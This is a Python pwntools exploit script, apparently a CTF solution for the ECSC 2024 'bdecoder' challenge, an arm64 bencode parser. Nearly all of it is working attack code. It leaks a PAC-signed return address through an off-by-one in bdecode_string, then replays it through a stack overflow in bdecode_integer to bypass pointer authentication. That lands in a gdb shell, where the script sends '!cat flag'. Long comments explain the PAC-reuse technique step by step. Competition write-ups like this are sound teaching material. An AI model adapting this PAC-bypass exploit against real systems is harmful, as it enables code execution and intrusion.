#!/usr/bin/env python3
#
# @mebeim - 2024-09-16
#

import os
import sys
from re import compile
from subprocess import check_output
from time import sleep

from pwn import context, log, remote, u64, p64


HOST = os.getenv('HOST', 'bdecoder.challs.jeopardy.ecsc2024.it')
PORT = int(os.getenv('PORT', 47006))
FLAG_EXP = compile(rb'ECSC\{[^}]+\}')
HASHCASH_EXP = compile(rb'for (\d+) bits with resource "([^"]+)"')


def solve_pow(r: remote):
	line = r.recvline(timeout=0.5)

	if b'do hashcash' in line.lower():
		bits, res = HASHCASH_EXP.findall(line)[0]
		cmd = ('hashcash', '-mC', '-b', bits, res)
		p = log.progress('Solving PoW')
		p.status(cmd)
		sol = check_output(cmd).strip()
		p.success(sol.decode())
		r.sendlineafter(b'Result: ', sol)
		sleep(0.5)
	elif line:
		r.unrecv(line)


def run() -> bool:
	with context.local(log_level='ERROR'):
		r = remote(HOST, PORT)

	solve_pow(r)

	# A stack frame has the following form (addresses increase downwards):
	#
	#      SP        <saved FP=X29>
	#      SP + 0x08 <saved PAC-signed LR=X30> (signed using FP=X29 as modifier)
	#      SP + 0x10 <...locals...>
	#      SP + 0x18 <...locals...>
	#      ...
	#      SP + 0xXX <caller stack frame>
	#
	# Set up the stack as follows (addresses increase downwards):
	#
	#      #   FUNCTION        FRAME SIZE      FP=X29 VALUE *ON ENTRY*
	#      15  bdecode_string  <not relevant>  <not relevant>
	#      14  bdecode         <not relevant>  <not relevant>
	# ===> 13  bdecode_list    <not relevant>  BASE - 0x140 <===================
	#      12  bdecode         0x20            BASE - 0x120
	#      11  bdecode_list    0x20            BASE - 0x100
	#      10  bdecode         0x20            BASE - 0xe0
	#      9   bdecode_list    0x20            BASE - 0xc0
	#      8   bdecode         0x20            BASE - 0xa0
	#      7   bdecode_list    0x20            BASE - 0x80
	#      6   bdecode         0x20            BASE - 0x60
	#      5   bdecode_list    0x20            BASE - 0x40
	#      4   bdecode         0x20            BASE - 0x20
	#      3   bdecode_list    0x20            BASE
	#      2   bdecode         <not relevant>  <not relevant>
	#      1   bdecode_line    <not relevant>  <not relevant>
	#      0   main            <not relevant>  <not relevant>
	#
	# Then, trigger the off-by-one bug in bdecode_string() and overwrite the LSB
	# of the buffer pointer making it point close enough to the frame 13 (this
	# is the reason for the 6 nested lists). This will leak the saved frame
	# pointer and PAC-signed return address of frame 13 belonging to
	# bdecode_list().
	#
	# The PAC-signed return address in frame 13 was signed using the frame
	# pointer (FP=X29) at the moment of entry in bdecode_list(), whose value was
	# exactly BASE - 0x140.

	r.send(b'llllll128:' + b'A' * 127 + b'\x60' + b'eee')
	leak = r.recvuntil(b'"]]]', drop=True)

	fp = u64(leak[-16:-8])
	pac_retaddr = u64(leak[-8:])

	log.success('Leaked FP = %#x', fp)
	log.success('Leaked signed LR = %#x', pac_retaddr)

	# We only close 3 of the 6 lists we created, so now the stack looks like
	# this (we are currentlly inside bdecode(), which will decode the next data
	# we send):
	#
	#       #   FUNCTION        FRAME SIZE      FP=X29 VALUE *ON ENTRY*
	#       8   bdecode         0x20            BASE - 0xa0
	#       7   bdecode_list    0x20            BASE - 0x80
	#       6   bdecode         0x20            BASE - 0x60
	#       5   bdecode_list    0x20            BASE - 0x40
	#       4   bdecode         0x20            BASE - 0x20
	#       3   bdecode_list    0x20            BASE
	#       2   bdecode         <not relevant>  <not relevant>
	#       1   bdecode_line    <not relevant>  <not relevant>
	#       0   main            <not relevant>  <not relevant>
	#
	#
	# Now set up the stack like this (we already had half of the frames):
	#
	#       #   FUNCTION            FRAME SIZE      FP=X29 VALUE *ON ENTRY*
	#       15  bdecode_integer     <not relevant>  <not relevant>
	# ====> 14  bdecode             <not relevant>  BASE - 0x140 <==============
	#       13  bdecode_key_value   0x10            BASE - 0x130
	#       12  bdecode_dictionary  0x20            BASE - 0x110
	#       11  bdecode             0x20            BASE - 0xf0
	#       10  bdecode_key_value   0x10            BASE - 0xe0
	#       9   bdecode_dictionary  0x20            BASE - 0xc0
	#       8   bdecode             0x20            BASE - 0xa0
	#       7   bdecode_list        0x20            BASE - 0x80
	#       6   bdecode             0x20            BASE - 0x60
	#       5   bdecode_list        0x20            BASE - 0x40
	#       4   bdecode             0x20            BASE - 0x20
	#       3   bdecode_list        0x20            BASE
	#       2   bdecode             <not relevant>  <not relevant>
	#       1   bdecode_line        <not relevant>  <not relevant>
	#       0   main                <not relevant>  <not relevant>
	#
	# We are again at the same depth as the first step when we got the leak.
	# This means that the value of the saved frame pointer (FP=X29) in frame 14
	# was again exactly BASE - 0x140, i.e. *the same as the one we leaked*. This
	# means that the PAC-signed saved return address (LR=X30) in frame 14 and
	# the one we leaked earlier used the exact same value (FP=X29) as modifier.
	#
	# The only thing that changes is the return address: here bdecode() in frame
	# 14 wants to return somewhere inside bdecode_key_value(). The previously
	# leaked PAC-signed return address refers to a bdecode_list() frame that
	# wanted to return somewhere inside bdecode(). Since both values were signed
	# with the same key (generated on program exec) and the same modifier
	# (frame pointer), the two are interchangeable and will both pass the
	# pointer-authenticated RETAA instruction.
	#
	# We can now trigger the small linear BOF in bdecode_integer() to overwrite
	# the saved frame pointer and PAC-signed return address of bdecode() in
	# frame 14 with the one we previously leaked. As a result, bdecode() will
	# happily return inside of itself.
	#
	# Upon return, the stack will contain garbage values. The bdecode() function
	# checks for the value of a local boolean variable at SP + 0x1f, which very
	# conveniently corresponds with the MSB of a PAC-signed saved LR. When this
	# bool variable is then checked at the end of bdecode() to choose whether to
	# spawn gdb-multiarch through system(), we will therefore have a 50% chance
	# of getting a GDB shell.

	fakeint = p64(fp) + p64(pac_retaddr)
	assert b'e' not in fakeint

	r.sendline(b'd1:Ad1:Bi7' + b'\0' * 31 + fakeint + b'e')

	if not r.recvuntil(b'(gdb)', timeout=2):
		with context.local(log_level='ERROR'):
			r.close()
		return False

	r.sendline(b'!cat flag')
	r.sendline(b'quit')

	match = r.recvregex(FLAG_EXP, capture=True, timeout=3)
	if match is None:
		with context.local(log_level='ERROR'):
			r.close()
		return False

	print(match.group(0).decode())
	return True


if __name__ == '__main__':
	context(arch='arm64')

	# Exploit has a 50% chance of success
	for _ in range(100):
		try:
			if run():
				break
		except EOFError:
			log.failure('EOFError, retrying...')
		except AssertionError:
			log.failure('Bad bytes in pointer, retrying...')
	else:
		sys.exit('Failed to run exploit, exceeded 100 attempts!')
